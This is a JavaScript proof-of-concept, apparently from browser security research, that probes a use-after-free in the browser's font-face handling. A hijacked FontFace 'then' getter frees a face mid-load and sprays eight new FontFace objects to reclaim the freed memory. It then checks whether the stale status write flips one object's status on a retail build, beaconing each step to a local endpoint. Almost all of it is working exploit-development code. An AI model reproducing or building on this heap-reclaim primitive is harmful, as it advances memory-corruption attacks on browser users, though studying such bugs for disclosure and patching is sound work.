// c042: does the stale m_status write land on a face we can see, on retail?
//
// Same trigger as c040, but the getter allocates 8 `new FontFace(...)` AFTER the free. On the ASAN build this
// is the one shape that does not crash: the first post-free CSSFontFace takes the freed chunk, and the stale
// m_status = newStatus writes Status::Success into it - so a face whose source cannot resolve
// (local("NoSuchFontName")) reads "loaded" while its seven siblings read "unloaded".
// That flip is plain JS, so retail can observe it: no sanitizer needed, and the process should survive.
(function(){
  function send(s){ try { navigator.sendBeacon('/beacon', 'c042-' + String(s)); } catch(e){} }
  function faceOf(fam){
    var f=null; try { document.fonts.forEach(function(x){ if(String(x.family).replace(/['"]/g,'')===fam) f=x; }); } catch(e){}
    return f;
  }
  send('boot');
  var made = [];
  try {
    var v = document.createElement('style'); v.id='v'; v.textContent='x{}';
    var f = document.createElement('style'); f.id='f';
    f.textContent='@font-face { font-family: t; src: local("Arial"); }';
    document.head.appendChild(v); document.head.appendChild(f);
    document.body.offsetHeight;
    var face = faceOf('t');
    send('face=' + (face ? 'found' : 'missing'));
    if (!face) return;
    try { void face.loaded; } catch(e){}

    Object.defineProperty(FontFace.prototype, 'then', { get: function(){
      send('getter-enter');
      try { var e=document.getElementById('v'); if(e) e.remove(); } catch(err){}
      try { void document.body.offsetHeight; send('layout'); } catch(err){}
      for (var i=0;i<8;i++){
        try { made.push(new FontFace('zz'+i, 'local("NoSuchFontName")')); } catch(err){ break; }
      }
      send('made=' + made.length);
      return undefined;
    }, configurable: true });

    send('calling-load');
    face.load();
    send('load-returned');
    setTimeout(function(){
      for (var i=0;i<made.length;i++){
        var st='?'; try { st = made[i].status; } catch(e){ st='threw'; }
        send('FACE i='+i+' status='+st);
      }
      send('ALIVE');
    }, 400);
  } catch(e){ send('outer:' + e.name); }
})();
